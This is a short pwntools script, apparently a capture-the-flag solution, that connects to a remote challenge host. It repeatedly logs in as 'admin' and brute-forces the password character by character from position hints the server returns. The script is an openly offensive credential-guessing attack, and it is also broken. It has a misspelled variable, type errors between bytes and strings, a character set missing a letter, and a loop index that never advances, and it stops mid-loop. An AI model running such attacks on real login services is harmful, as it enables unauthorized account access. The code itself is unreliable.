from pwn import *

shell = remote("jh2i.com",50026)

passchrs = 'abcdefghijklnopqrstuvwxyz_{}'
guessed = [''] * 100

import re
i = 0
while True:
    r = shell.recvuntil(b'> ')
    shell.send('2')
    r = shell.recvuntil(b'Username: ')
    shell.send('admin')
    r = shell.recvuntil(b'Password: ')
    
    patn = re.search(r"at position (\d+), (\d+), and (\d+)", r)
    p1, p2, p3 = patn.group(1), patn.group(2), patn.group(3)
    ps1, ps2, ps3 =  passchrs[i], passchrs[i], passchrs[i]
    if guessed[p1]:
        ps1 = guesed[p1]
    if guessed[p2]:
        ps2 = guesed[p2]     
    if guessed[p3]:
        ps3 = guesed[p3] 
    shell.send("{} {} {}".format(ps1,ps2,ps3))
    r = shell.recvuntil(b'> ')

    patn = re.search(r"(\d+) characters: CORRECT",r)
    
